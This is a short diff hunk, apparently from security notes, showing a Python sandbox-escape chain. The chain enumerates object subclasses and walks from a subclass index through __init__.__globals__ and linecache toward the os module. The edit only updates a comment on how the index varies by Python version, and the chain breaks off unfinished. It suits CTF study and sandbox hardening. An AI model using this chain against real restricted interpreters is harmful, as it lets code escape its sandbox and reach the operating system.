@@ -33,7 +33,7 @@ subs = ''.__class__.__mro__[1].__subclasses__()
 for i, cls in enumerate(subs):
     print(i, cls.__name__)
 
-# Index typically 49 or 59 for catch_warnings
+# Index varies by Python version (49/59/62 in 3.8/3.10/3.11+); enumerate at runtime
 # Access os via warnings -> linecache chain
 ().__class__.__base__.__subclasses__()[59] \
     .__init__.__globals__["linecache"] \
